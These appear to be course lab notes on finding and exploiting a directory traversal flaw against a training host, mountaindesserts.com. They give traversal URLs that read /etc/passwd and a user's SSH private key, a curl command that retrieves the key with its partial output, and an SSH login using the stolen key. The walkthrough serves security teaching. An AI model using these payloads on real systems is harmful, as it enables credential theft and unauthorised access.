# Identifying and Exploiting Directory Traversals

Example of a link
>``` shell
>https://example.com/cms/login.php?language=en.html
>```

Contents of /etc/hosts
>``` shell
>127.0.0.1       localhost
>127.0.1.1       kali
>192.168.50.16   mountaindesserts.com
>...
>```

Entire URL of our Directory Traversal attack (1)
>``` shell
>http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
>```

Entire URL of our Directory Traversal attack (2)
>``` shell
>http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
>```

SSH Private Key via curl
>``` shell
>kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
>
># ========== Expected Result ==========
>...
>-----BEGIN OPENSSH PRIVATE KEY-----
>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
>NhAAAAAwEAAQAAAYEAz+pEKI1OmULVSs8ojO/sZseiv3zf2dbH6LSyYuj3AHkcxIND7UTw
>XdUTtUeeJhbTC0h5S2TWFJ3OGB0zjCqsEI16ZHsaKI9k2CfNmpl0siekm9aQGxASpTiYOs
>KCZOFoPU6kBkKyEhfjB82Ea1VoAvx4J4z7sNx1+wydQ/Kf7dawd95QjBuqLH9kQIEjkOGf
>BemTOAyCdTBxzUhDz1siP9uyofquA5vhmMXWyy68pLKXpiQqTF+foGQGG90MBXS5hwskYg
>...
>lpWPWFQro9wzJ/uJsw/lepsqjrg2UvtrkAAADBAN5b6pbAdNmsQYmOIh8XALkNHwSusaK8
>bM225OyFIxS+BLieT7iByDK4HwBmdExod29fFPwG/6mXUL2Dcjb6zKJl7AGiyqm5+0Ju5e
>hDmrXeGZGg/5unGXiNtsoTJIfVjhM55Q7OUQ9NSklONUOgaTa6dyUYGqaynvUVJ/XxpBrb
>iRdp0z8X8E5NZxhHnarkQE2ZHyVTSf89NudDoXiWQXcadkyrIXxLofHPrQzPck2HvWhZVA
>+2iMijw3FvY/Fp4QAAAA1vZmZzZWNAb2Zmc2VjAQIDBA==
>-----END OPENSSH PRIVATE KEY-----
>...
># =====================================
>```

Using the Private Key to connect via SSH
>``` shell
>kali@kali:~$ ssh -i dt_key -p 2222 offsec@mountaindesserts.com
>
># ========== Expected Result ==========
>The authenticity of host '[mountaindesserts.com]:2222 ([192.168.50.16]:2222)' can't be established.
>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
>...
>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
>@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
>Permissions 0644 for '/home/kali/dt_key' are too open.
>It is required that your private key files are NOT accessible by others.
>This private key will be ignored.
>...
># =====================================
>
>kali@kali:~$ chmod 400 dt_key
>
>kali@kali:~$ ssh -i dt_key -p 2222 offsec@mountaindesserts.com
>
># ========== Expected Result ==========
>...
>offsec@68b68f3eb343:~$ 
># =====================================
>```
